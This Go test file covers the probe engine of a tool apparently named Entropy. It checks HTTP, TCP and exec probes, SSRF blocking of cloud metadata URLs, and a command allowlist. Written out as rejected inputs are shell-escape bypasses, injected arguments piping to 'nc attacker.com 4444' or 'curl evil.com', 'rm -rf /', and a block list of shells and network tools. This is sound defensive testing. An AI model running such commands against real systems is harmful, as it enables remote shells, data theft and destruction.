package engine

import (
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/ibrahimkizilarslan/entropy/pkg/config"
)

func TestRunProbe_HTTP(t *testing.T) {
	// Start a test HTTP server
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/health" {
			w.WriteHeader(http.StatusOK)
		} else {
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer server.Close()

	probeHTTP := &config.ProbeSpec{
		Type:    "http",
		URL:     server.URL + "/health",
		Timeout: 2,
	}

	t.Run("success", func(t *testing.T) {
		result := RunProbe(probeHTTP, nil)
		if !result.Success {
			t.Errorf("Expected success for successful probe, got %v", result.Message)
		}
	})

	t.Run("expect_status success", func(t *testing.T) {
		status := 200
		probe := *probeHTTP
		probe.ExpectStatus = &status
		result := RunProbe(&probe, nil)
		if !result.Success {
			t.Errorf("Expected success for expected status 200, got %v", result.Message)
		}
	})

	t.Run("expect_status failure", func(t *testing.T) {
		status := 201
		probe := *probeHTTP
		probe.ExpectStatus = &status
		result := RunProbe(&probe, nil)
		if result.Success {
			t.Error("Expected failure for mismatched status, got success")
		}
	})

	t.Run("404 fallback to success if not specified", func(t *testing.T) {
		// In the current implementation, any response without an error means success if no expectations
		probe := *probeHTTP
		probe.URL = server.URL + "/notfound"
		result := RunProbe(&probe, nil)
		if !result.Success {
			t.Errorf("Expected success for 404 status without expect_status, got %v", result.Message)
		}
	})

	t.Run("timeout", func(t *testing.T) {
		timeoutServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			time.Sleep(2 * time.Second)
			w.WriteHeader(http.StatusOK)
		}))
		defer timeoutServer.Close()

		probe := *probeHTTP
		probe.URL = timeoutServer.URL
		probe.Timeout = 1

		result := RunProbe(&probe, nil)
		if result.Success {
			t.Error("Expected failure for timeout, got success")
		}
	})
}

func TestRunProbe_UnknownType(t *testing.T) {
	probe := &config.ProbeSpec{
		Type: "unknown",
	}
	result := RunProbe(probe, nil)
	if result.Success {
		t.Error("Expected failure for unknown probe type, got success")
	}
}

func TestValidateProbeURL_BlocksMetadata(t *testing.T) {
	tests := []struct {
		name    string
		url     string
		wantErr bool
	}{
		{"AWS metadata", "http://169.254.169.254/latest/meta-data/", true},
		{"GCP metadata", "http://metadata.google.internal/computeMetadata/v1/", true},
		{"normal URL", "http://example.com/health", false},
		{"localhost allowed", "http://localhost:8080/health", false},
		{"empty hostname", "http:///path", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateProbeURL(tt.url)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateProbeURL(%q) error = %v, wantErr %v", tt.url, err, tt.wantErr)
			}
		})
	}
}

func TestValidateProbeHostPort_BlocksMetadata(t *testing.T) {
	tests := []struct {
		name     string
		hostPort string
		wantErr  bool
	}{
		{"metadata IP", "169.254.169.254:80", true},
		{"normal host", "localhost:6379", false},
		{"private IP allowed", "192.168.1.1:8080", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateProbeHostPort(tt.hostPort)
			if (err != nil) != tt.wantErr {
				t.Errorf("validateProbeHostPort(%q) error = %v, wantErr %v", tt.hostPort, err, tt.wantErr)
			}
		})
	}
}

func TestHTTPProbe_SSRFBlocked(t *testing.T) {
	probe := &config.ProbeSpec{
		Type:    "http",
		URL:     "http://169.254.169.254/latest/meta-data/",
		Timeout: 2,
	}
	result := RunProbe(probe, nil)
	if result.Success {
		t.Error("Expected SSRF protection to block metadata URL")
	}
	if result.Message == "" {
		t.Error("Expected error message for blocked URL")
	}
}

func TestTCPProbe_SSRFBlocked(t *testing.T) {
	probe := &config.ProbeSpec{
		Type:     "tcp",
		HostPort: "169.254.169.254:80",
		Timeout:  2,
	}
	result := RunProbe(probe, nil)
	if result.Success {
		t.Error("Expected SSRF protection to block metadata host")
	}
}

// TestValidateExecCommand_AllowsDefaultCommands verifies the read-only
// diagnostic commands in the default allowlist are permitted.
func TestValidateExecCommand_AllowsDefaultCommands(t *testing.T) {
	allowed := []string{"cat", "ls", "stat", "test", "true", "false", "echo", "pgrep", "ps", "head", "tail", "wc", "grep"}
	for _, cmd := range allowed {
		t.Run(cmd, func(t *testing.T) {
			if err := validateExecCommand([]string{cmd, "arg1"}); err != nil {
				t.Errorf("expected %q to be allowed, got error: %v", cmd, err)
			}
		})
	}
}

// TestValidateExecCommand_AllowsAbsolutePath verifies the allowlist check
// works against the base name even when an absolute path is supplied.
func TestValidateExecCommand_AllowsAbsolutePath(t *testing.T) {
	if err := validateExecCommand([]string{"/bin/cat", "/etc/hostname"}); err != nil {
		t.Errorf("expected /bin/cat to be allowed, got error: %v", err)
	}
}

// TestValidateExecCommand_RejectsBypassVectors verifies that commands which
// were NOT on the old blocklist, but which can still be abused to obtain
// shell/code execution, are rejected by the new allowlist model. These are
// exactly the class of bypass a blocklist cannot close.
func TestValidateExecCommand_RejectsBypassVectors(t *testing.T) {
	bypasses := [][]string{
		{"env", "sh", "-c", "id"},
		{"busybox", "sh"},
		{"awk", "BEGIN{system(\"id\")}"},
		{"find", ".", "-exec", "id", ";"},
		{"xargs", "id"},
		{"vi", "-c", ":!id"},
	}
	for _, cmd := range bypasses {
		t.Run(cmd[0], func(t *testing.T) {
			if err := validateExecCommand(cmd); err == nil {
				t.Errorf("expected %v to be rejected, got no error", cmd)
			}
		})
	}
}

// TestValidateExecCommand_StillBlocksLegacyBlockedCommands verifies commands
// that were explicitly blocked before (shells, interpreters, network tools)
// remain rejected under the new allowlist model.
func TestValidateExecCommand_StillBlocksLegacyBlockedCommands(t *testing.T) {
	legacy := []string{"sh", "bash", "curl", "wget", "nc", "python3", "rm", "ssh"}
	for _, cmd := range legacy {
		t.Run(cmd, func(t *testing.T) {
			if err := validateExecCommand([]string{cmd}); err == nil {
				t.Errorf("expected %q to be rejected, got no error", cmd)
			}
		})
	}
}

// TestValidateExecCommand_RejectsShellMetacharacters verifies the
// defense-in-depth argument scan blocks shell metacharacters even on an
// allowlisted executable.
func TestValidateExecCommand_RejectsShellMetacharacters(t *testing.T) {
	dangerous := []string{
		"foo; rm -rf /",
		"foo | nc attacker.com 4444",
		"foo && curl evil.com",
		"$(id)",
		"`id`",
		"foo > /etc/passwd",
	}
	for _, arg := range dangerous {
		t.Run(arg, func(t *testing.T) {
			if err := validateExecCommand([]string{"cat", arg}); err == nil {
				t.Errorf("expected argument %q to be rejected, got no error", arg)
			}
		})
	}
}

// TestValidateExecCommand_EmptyCommand verifies an empty command is rejected.
func TestValidateExecCommand_EmptyCommand(t *testing.T) {
	if err := validateExecCommand(nil); err == nil {
		t.Error("expected empty command to be rejected")
	}
}

// TestValidateExecCommand_EnvAllowlistExtension verifies ENTROPY_EXEC_ALLOWLIST
// lets operators extend the allowlist without forking Entropy.
func TestValidateExecCommand_EnvAllowlistExtension(t *testing.T) {
	if err := validateExecCommand([]string{"whoami"}); err == nil {
		t.Fatal("expected 'whoami' to be rejected by default, got no error")
	}

	t.Setenv("ENTROPY_EXEC_ALLOWLIST", "whoami, id")

	if err := validateExecCommand([]string{"whoami"}); err != nil {
		t.Errorf("expected 'whoami' to be allowed via ENTROPY_EXEC_ALLOWLIST, got error: %v", err)
	}
	if err := validateExecCommand([]string{"id"}); err != nil {
		t.Errorf("expected 'id' to be allowed via ENTROPY_EXEC_ALLOWLIST, got error: %v", err)
	}
	if err := validateExecCommand([]string{"curl"}); err == nil {
		t.Error("expected 'curl' to remain rejected even with ENTROPY_EXEC_ALLOWLIST set for other commands")
	}
}

// TestRunExecProbe_BlocksDisallowedCommand verifies the end-to-end exec probe
// path rejects a disallowed command before ever calling the runtime.
func TestRunExecProbe_BlocksDisallowedCommand(t *testing.T) {
	mock := NewMockRuntime()
	probe := &config.ProbeSpec{
		Type:    "exec",
		Target:  "service-a",
		Command: "env sh -c id",
	}
	result := RunProbe(probe, mock)
	if result.Success {
		t.Error("expected exec probe with disallowed command to fail")
	}
	if mock.CallCount("ExecCommand") != 0 {
		t.Error("expected ExecCommand to never be called for a disallowed command")
	}
}

// TestRunExecProbe_AllowsSafeCommand verifies the end-to-end exec probe path
// executes an allowlisted command normally.
func TestRunExecProbe_AllowsSafeCommand(t *testing.T) {
	mock := NewMockRuntime()
	mock.ExecExit = 0
	probe := &config.ProbeSpec{
		Type:    "exec",
		Target:  "service-a",
		Command: "cat /etc/hostname",
	}
	result := RunProbe(probe, mock)
	if !result.Success {
		t.Errorf("expected allowlisted exec probe to succeed, got: %s", result.Message)
	}
	if mock.CallCount("ExecCommand") != 1 {
		t.Errorf("expected ExecCommand to be called once, got %d", mock.CallCount("ExecCommand"))
	}
}
